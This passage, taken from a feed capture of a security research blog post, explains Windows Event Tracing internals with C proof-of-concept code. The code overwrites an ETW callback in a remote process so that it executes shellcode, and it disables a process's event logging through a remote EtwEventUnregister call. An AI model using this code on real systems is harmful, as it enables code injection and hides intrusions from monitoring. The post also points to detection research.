#808030;\">&gt;</span>Wnode<span style=\"color: #808030;\">.</span>Flags         <span style=\"color: #808030;\">=</span> WNODE_FLAG_TRACED_GUID<span style=\"color: #800080;\">;</span>\n        prop<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>LogFileMode         <span style=\"color: #808030;\">=</span> EVENT_TRACE_REAL_TIME_MODE<span style=\"color: #800080;\">;</span>\n        prop<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>LogFileNameOffset   <span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span>\n        prop<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>LoggerNameOffset    <span style=\"color: #808030;\">=</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>EVENT_TRACE_PROPERTIES<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        \n        <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>StartTrace<span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">&amp;</span>ht<span style=\"color: #808030;\">,</span> etwname<span style=\"color: #808030;\">,</span> prop<span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">=</span> <span style=\"color: #7d0045;\">ERROR_SUCCESS</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n          <span style=\"color: #696969;\">// save callback</span>\n          callback <span style=\"color: #808030;\">=</span> re<span style=\"color: #808030;\">.</span>Callback<span style=\"color: #800080;\">;</span>\n          re<span style=\"color: #808030;\">.</span>Callback <span style=\"color: #808030;\">=</span> cs<span style=\"color: #800080;\">;</span>\n          \n          <span style=\"color: #696969;\">// overwrite existing entry with shellcode address</span>\n          <span style=\"color: #400000;\">WriteProcessMemory</span><span style=\"color: #808030;\">(</span>hp<span style=\"color: #808030;\">,</span> \n            <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PBYTE</span><span style=\"color: #808030;\">)</span>node <span style=\"color: #808030;\">+</span> offsetof<span style=\"color: #808030;\">(</span>ETW_USER_REG_ENTRY<span style=\"color: #808030;\">,</span> Callback<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">,</span> \n            <span style=\"color: #808030;\">&amp;</span>cs<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">ULONG_PTR</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>wr<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n          \n          <span style=\"color: #696969;\">// trigger execution of shellcode by enabling trace</span>\n          <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>EnableTraceEx<span style=\"color: #808030;\">(</span>\n            <span style=\"color: #808030;\">&amp;</span>re<span style=\"color: #808030;\">.</span>ProviderId<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> ht<span style=\"color: #808030;\">,</span>\n            <span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">,</span> TRACE_LEVEL_VERBOSE<span style=\"color: #808030;\">,</span> \n            <span style=\"color: #808030;\">(</span><span style=\"color: #008c00;\">1</span> <span style=\"color: #808030;\">&lt;</span><span style=\"color: #808030;\">&lt;</span> <span style=\"color: #008c00;\">16</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">=</span> <span style=\"color: #7d0045;\">ERROR_SUCCESS</span><span style=\"color: #808030;\">)</span> \n          <span style=\"color: #800080;\">{</span>\n            status <span style=\"color: #808030;\">=</span> TRUE<span style=\"color: #800080;\">;</span>\n          <span style=\"color: #800080;\">}</span>\n          \n          <span style=\"color: #696969;\">// restore callback</span>\n          <span style=\"color: #400000;\">WriteProcessMemory</span><span style=\"color: #808030;\">(</span>hp<span style=\"color: #808030;\">,</span> \n            <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PBYTE</span><span style=\"color: #808030;\">)</span>node <span style=\"color: #808030;\">+</span> offsetof<span style=\"color: #808030;\">(</span>ETW_USER_REG_ENTRY<span style=\"color: #808030;\">,</span> Callback<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">,</span> \n            <span style=\"color: #808030;\">&amp;</span>callback<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">ULONG_PTR</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>wr<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n\n          <span style=\"color: #696969;\">// disable tracing</span>\n          ControlTrace<span style=\"color: #808030;\">(</span>ht<span style=\"color: #808030;\">,</span> etwname<span style=\"color: #808030;\">,</span> prop<span style=\"color: #808030;\">,</span> EVENT_TRACE_CONTROL_STOP<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        <span style=\"color: #800080;\">}</span> <span style=\"color: #800000; font-weight: bold;\">else</span> <span style=\"color: #800080;\">{</span>\n          xstrerror<span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">StartTrace</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        <span style=\"color: #800080;\">}</span>\n        <span style=\"color: #400000;\">LocalFree</span><span style=\"color: #808030;\">(</span>prop<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        <span style=\"color: #400000;\">VirtualFreeEx</span><span style=\"color: #808030;\">(</span>hp<span style=\"color: #808030;\">,</span> cs<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> MEM_DECOMMIT <span style=\"color: #808030;\">|</span> MEM_RELEASE<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800080;\">}</span>        \n    <span style=\"color: #800080;\">}</span> <span style=\"color: #800000; font-weight: bold;\">else</span> <span style=\"color: #800080;\">{</span>\n      <span style=\"color: #603000;\">wprintf</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">ERROR: Unable to get registration entry.</span><span style=\"color: #0f69ff;\">\\n</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n    <span style=\"color: #400000;\">CloseHandle</span><span style=\"color: #808030;\">(</span>hp<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800000; font-weight: bold;\">return</span> status<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-04-08 17:54:34 UTC --></p>\n<p><img alt=\"\" class=\"alignnone size-full wp-image-4616\" height=\"337\" src=\"https://modexp.files.wordpress.com/2020/04/etw_dumper_injection.png\" width=\"640\" /></p>\n<h2 id=\"disable\">6. Disable Tracing</h2>\n<p>If you decide to examine <strong>clr!McGenControlCallbackV2</strong> in more detail, you&#8217;ll see that it changes values in the callback context to enable or disable event tracing. For CLR, the following structure and function are used. Again, this may be defined differently for different versions of the CLR.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _MCGEN_TRACE_CONTEXT <span style=\"color: #800080;\">{</span>\n    TRACEHANDLE      RegistrationHandle<span style=\"color: #800080;\">;</span>\n    TRACEHANDLE      Logger<span style=\"color: #800080;\">;</span>\n    ULONGLONG        MatchAnyKeyword<span style=\"color: #800080;\">;</span>\n    ULONGLONG        MatchAllKeyword<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">ULONG</span>            Flags<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">ULONG</span>            IsEnabled<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">UCHAR</span>            Level<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">UCHAR</span>            Reserve<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">USHORT</span>           EnableBitsCount<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PULONG</span>           EnableBitMask<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800000; font-weight: bold;\">const</span> ULONGLONG<span style=\"color: #808030;\">*</span> EnableKeyWords<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800000; font-weight: bold;\">const</span> <span style=\"color: #603000;\">UCHAR</span><span style=\"color: #808030;\">*</span>     EnableLevel<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span> MCGEN_TRACE_CONTEXT<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PMCGEN_TRACE_CONTEXT<span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #800000; font-weight: bold;\">void</span> McGenControlCallbackV2<span style=\"color: #808030;\">(</span>\n  LPCGUID              SourceId<span style=\"color: #808030;\">,</span> \n  <span style=\"color: #603000;\">ULONG</span>                IsEnabled<span style=\"color: #808030;\">,</span> \n  <span style=\"color: #603000;\">UCHAR</span>                Level<span style=\"color: #808030;\">,</span> \n  ULONGLONG            MatchAnyKeyword<span style=\"color: #808030;\">,</span> \n  ULONGLONG            MatchAllKeyword<span style=\"color: #808030;\">,</span> \n  <span style=\"color: #603000;\">PVOID</span>                FilterData<span style=\"color: #808030;\">,</span> \n  PMCGEN_TRACE_CONTEXT CallbackContext<span style=\"color: #808030;\">)</span> \n<span style=\"color: #800080;\">{</span>\n  <span style=\"color: #800000; font-weight: bold;\">int</span> cnt<span style=\"color: #800080;\">;</span>\n  \n  <span style=\"color: #696969;\">// if we have a context</span>\n  <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>CallbackContext<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #696969;\">// and control code is not zero</span>\n    <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>IsEnabled<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      <span style=\"color: #696969;\">// enable tracing?</span>\n      <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>IsEnabled <span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">=</span> EVENT_CONTROL_CODE_ENABLE_PROVIDER<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        <span style=\"color: #696969;\">// set the context</span>\n        CallbackContext<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>MatchAnyKeyword <span style=\"color: #808030;\">=</span> MatchAnyKeyword<span style=\"color: #800080;\">;</span>\n        CallbackContext<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>MatchAllKeyword <span style=\"color: #808030;\">=</span> MatchAllKeyword<span style=\"color: #800080;\">;</span>\n        CallbackContext<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>Level           <span style=\"color: #808030;\">=</span> Level<span style=\"color: #800080;\">;</span>\n        CallbackContext<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>IsEnabled       <span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #800080;\">;</span>\n        \n        <span style=\"color: #696969;\">// ...other code omitted...</span>\n      <span style=\"color: #800080;\">}</span>\n    <span style=\"color: #800080;\">}</span> <span style=\"color: #800000; font-weight: bold;\">else</span> <span style=\"color: #800080;\">{</span>\n      <span style=\"color: #696969;\">// disable tracing</span>\n      CallbackContext<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>IsEnabled       <span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span>\n      CallbackContext<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>Level           <span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span>\n      CallbackContext<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>MatchAnyKeyword <span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span>\n      CallbackContext<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>MatchAllKeyword <span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span>\n      \n      <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>CallbackContext<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>EnableBitsCount <span style=\"color: #808030;\">&gt;</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        \n        <span style=\"color: #400000;\">ZeroMemory</span><span style=\"color: #808030;\">(</span>CallbackContext<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>EnableBitMask<span style=\"color: #808030;\">,</span>\n          <span style=\"color: #008c00;\">4</span> <span style=\"color: #808030;\">*</span> <span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span>CallbackContext<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>EnableBitsCount <span style=\"color: #808030;\">-</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">/</span> <span style=\"color: #008c00;\">32</span> <span style=\"color: #808030;\">+</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800080;\">}</span>\n    <span style=\"color: #800080;\">}</span>\n    EtwCallback<span style=\"color: #808030;\">(</span>\n      SourceId<span style=\"color: #808030;\">,</span> IsEnabled<span style=\"color: #808030;\">,</span> Level<span style=\"color: #808030;\">,</span> \n      MatchAnyKeyword<span style=\"color: #808030;\">,</span> MatchAllKeyword<span style=\"color: #808030;\">,</span> \n      FilterData<span style=\"color: #808030;\">,</span> CallbackContext<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n  <span style=\"color: #800080;\">}</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-04-05 22:46:38 UTC --></p>\n<p>There are a number of options to disable CLR logging that don&#8217;t require patching code.</p>\n<ul>\n<li>Invoke McGenControlCallbackV2 using <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/evntprov/nc-evntprov-penablecallback\">EVENT_CONTROL_CODE_DISABLE_PROVIDER</a>.</li>\n<li>Directly modify the MCGEN_TRACE_CONTEXT and ETW registration structures to prevent further logging.</li>\n<li>Invoke EventUnregister passing in the registration handle.</li>\n</ul>\n<p>The simplest way is passing the registration handle to <strong>ntdll!EtwEventUnregister</strong>. The following is just a PoC.</p>\n<p><img alt=\"\" class=\"alignnone size-full wp-image-4633\" height=\"414\" src=\"https://modexp.files.wordpress.com/2020/04/etw_dumper_disable-1.png\" width=\"640\" /></p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #603000;\">BOOL</span> etw_disable<span style=\"color: #808030;\">(</span>\n    <span style=\"color: #603000;\">HANDLE</span>             hp<span style=\"color: #808030;\">,</span>\n    PRTL_BALANCED_NODE node<span style=\"color: #808030;\">,</span>\n    <span style=\"color: #603000;\">USHORT</span>             index<span style=\"color: #808030;\">)</span> \n<span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">HMODULE</span>               m<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">HANDLE</span>                ht<span style=\"color: #800080;\">;</span>\n    RtlCreateUserThread_t pRtlCreateUserThread<span style=\"color: #800080;\">;</span>\n    CLIENT_ID             cid<span style=\"color: #800080;\">;</span>\n    NTSTATUS              nt<span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">~</span><span style=\"color: #008c00;\">0</span><span style=\"color: #006600;\">UL</span><span style=\"color: #800080;\">;</span>\n    REGHANDLE             RegHandle<span style=\"color: #800080;\">;</span>\n    EventUnregister_t     pEtwEventUnregister<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">ULONG</span>                 Result<span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// resolve address of API for creating new thread</span>\n    m <span style=\"color: #808030;\">=</span> <span style=\"color: #400000;\">GetModuleHandle</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">ntdll.dll</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    pRtlCreateUserThread <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>RtlCreateUserThread_t<span style=\"color: #808030;\">)</span>\n        <span style=\"color: #400000;\">GetProcAddress</span><span style=\"color: #808030;\">(</span>m<span style=\"color: #808030;\">,</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0000e6;\">RtlCreateUserThread</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// create registration handle    </span>\n    RegHandle           <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>REGHANDLE<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span>ULONG64<span style=\"color: #808030;\">)</span>node <span style=\"color: #808030;\">|</span> <span style=\"color: #808030;\">(</span>ULONG64<span style=\"color: #808030;\">)</span>index <span style=\"color: #808030;\">&lt;</span><span style=\"color: #808030;\">&lt;</span> <span style=\"color: #008c00;\">48</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    pEtwEventUnregister <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>EventUnregister_t<span style=\"color: #808030;\">)</span><span style=\"color: #400000;\">GetProcAddress</span><span style=\"color: #808030;\">(</span>m<span style=\"color: #808030;\">,</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0000e6;\">EtwEventUnregister</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #696969;\">// execute payload in remote process</span>\n    <span style=\"color: #603000;\">printf</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">\"</span><span style=\"color: #0000e6;\">  [ Executing EventUnregister in remote process.</span><span style=\"color: #0f69ff;\">\\n</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    nt <span style=\"color: #808030;\">=</span> pRtlCreateUserThread<span style=\"color: #808030;\">(</span>hp<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> FALSE<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> \n      <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> pEtwEventUnregister<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PVOID</span><span style=\"color: #808030;\">)</span>RegHandle<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>ht<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>cid<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #603000;\">printf</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">\"</span><span style=\"color: #0000e6;\">  [ NTSTATUS is </span><span style=\"color: #007997;\">%lx</span><span style=\"color: #0f69ff;\">\\n</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> nt<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #400000;\">WaitForSingleObject</span><span style=\"color: #808030;\">(</span>ht<span style=\"color: #808030;\">,</span> INFINITE<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// read result of EtwEventUnregister</span>\n    <span style=\"color: #400000;\">GetExitCodeThread</span><span style=\"color: #808030;\">(</span>ht<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>Result<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #400000;\">CloseHandle</span><span style=\"color: #808030;\">(</span>ht<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #400000;\">SetLastError</span><span style=\"color: #808030;\">(</span>Result<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>Result <span style=\"color: #808030;\">!</span><span style=\"color: #808030;\">=</span> <span style=\"color: #7d0045;\">ERROR_SUCCESS</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      xstrerror<span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">etw_disable</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800000; font-weight: bold;\">return</span> FALSE<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n    disabled_cnt<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #800080;\">;</span> \n    <span style=\"color: #800000; font-weight: bold;\">return</span> TRUE<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-04-09 12:57:58 UTC --></p>\n<h2 id=\"research\">7. Further Research</h2>\n<p>I may have missed articles/tools on ETW. Feel free to email me with the details.</p>\n<ul>\n<li><a href=\"https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63\">Tampering with Windows Event Tracing: Background, Offense, and Defense</a></li>\n<p> by <a href=\"https://twitter.com/mattifestation\">Matt Graeber</a></p>\n<li><a href=\"https://github.com/TheWover/ModuleMonitor\">ModuleMonitor</a> by <a href=\"https://twitter.com/TheRealWover\">TheWover</a></li>\n<li><a href=\"https://github.com/fireeye/SilkETW\">SilkETW</a> by <a href=\"https://twitter.com/FuzzySec\">FuzzySec</a></li>\n<li><a href=\"https://github.com/zodiacon/EtwExplorer\">ETW Explorer.</a>, by <a href=\"https://twitter.com/zodiacon\">Pavel Yosifovich</a></li>\n<li><a href=\"https://github.com/wbenny/EtwConsumerNT\">EtwConsumerNT</a>, by <a href=\"https://twitter.com/PetrBenes\">Petr Benes</a></li>\n<li><a href=\"https://github.com/endgameinc/ClrGuard\">ClrGuard</a> by Endgame.</li>\n<li><a href=\"https://blog.f-secure.com/detecting-malicious-use-of-net-part-1/\">Detecting Malicious Use of .NET Part 1</a></li>\n<li><a href=\"https://blog.f-secure.com/detecting-malicious-use-of-net-part-2/\">Detecting Malicious Use of .NET Part 2</a></li>\n<li><a href=\"https://www.elastic.co/blog/hunting-memory-net-attacks\">Hunting For In-Memory .NET Attacks</a></li>\n<li><a href=\"https://work.delaat.net/rp/2019-2020/p56/report.pdf\">Detecting Fileless Malicious Behaviour of .NET C2Agents using ETW</a></li>\n<li><a href=\"https://ruxcon.org.au/assets/2016/slides/ETW_16_RUXCON_NJR_no_notes.pdf\">Make ETW Great Again.</a>\n<li><a href=\"https://lowleveldesign.org/2016/08/23/enumerating-appdomains-in-a-remote-process/\">Enumerating AppDomains in a remote process</a></li>\n<li><a href=\"http://redplait.blogspot.com/2017/09/etw-private-loggers.html\">ETW private loggers</a>, <a href=\"http://redplait.blogspot.com/2012/03/etweventregister-on-w8-consumer-preview.html\">EtwEventRegister on w8 consumer preview</a>, <a href=\"http://redplait.blogspot.com/2011/02/etweventregister.html\">EtwEventRegister</a>, by <a href=\"https://twitter.com/real_redp\">redplait</a></li>\n<li><a href=\"https://twitter.com/dez_/status/938074904666271744\">Disable those pesky user mode etw loggers</a></li>\n<li><a href=\"https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32\">Disable ETW of the current PowerShell session </a></li>\n<li><a href=\"https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/\">Universally Evading Sysmon and ETW</a></li>\n</ul>"
                }
            ],
            "wfw_commentrss": "https://modexp.wordpress.com/2020/04/08/red-teams-etw/feed/",
            "slash_comments": "4",
            "media_thumbnail": [
                {
                    "url": "https://modexp.files.wordpress.com/2020/04/clr_etw.png"
                }
            ],
            "href": "",
            "media_content": [
                {
                    "url": "https://modexp.files.wordpress.com/2020/04/clr_etw.png",
                    "medium": "image"
                },
                {
                    "url": "https://0.gravatar.com/avatar/6505a0ec0ae84dac45856b91b0cc2343?s=96&d=identicon&r=G",
                    "medium": "image"
                },
                {
                    "url": "https://modexp.files.wordpress.com/2020/04/etw_dumper_injection.png",
                    "medium": "image"
                },
                {
                    "url": "https://modexp.files.wordpress.com/2020/04/etw_dumper_disable-1.png",
                    "medium": "image"
                }
            ]
        }
    ]
}